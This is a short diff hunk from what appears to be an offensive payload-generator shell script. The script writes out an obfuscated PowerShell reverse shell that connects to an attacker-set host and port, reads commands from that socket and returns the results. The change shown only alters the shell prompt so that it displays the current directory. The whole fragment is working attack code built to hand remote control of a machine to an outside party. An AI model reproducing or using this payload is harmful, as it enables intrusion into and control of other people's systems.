@@ -12029,7 +12029,7 @@ echo "\$socket = new-object \$PSArgException('$lhost', $lport);if(\$socket -eq \
 echo "\$writer = new-object System.IO.\$icmpv6(\$stream);\$buffer = new-object System.Byte[] 1024;" >> $IPATH/output/$NaM.ps1
 echo "\$comm = new-object \$NewObjectCommand;" >> $IPATH/output/$NaM.ps1
 echo "do{" >> $IPATH/output/$NaM.ps1
-echo "	\$writer.Write(\"prompt> \");" >> $IPATH/output/$NaM.ps1
+echo "	\$writer.Write((pwd).Path + '> ');" >> $IPATH/output/$NaM.ps1
 echo "	\$writer.Flush();" >> $IPATH/output/$NaM.ps1
 echo "	\$read = \$null;" >> $IPATH/output/$NaM.ps1
 echo "	while(\$stream.DataAvailable -or (\$read = \$stream.Read(\$buffer, 0, 1024)) -eq \$null){};" >> $IPATH/output/$NaM.ps1
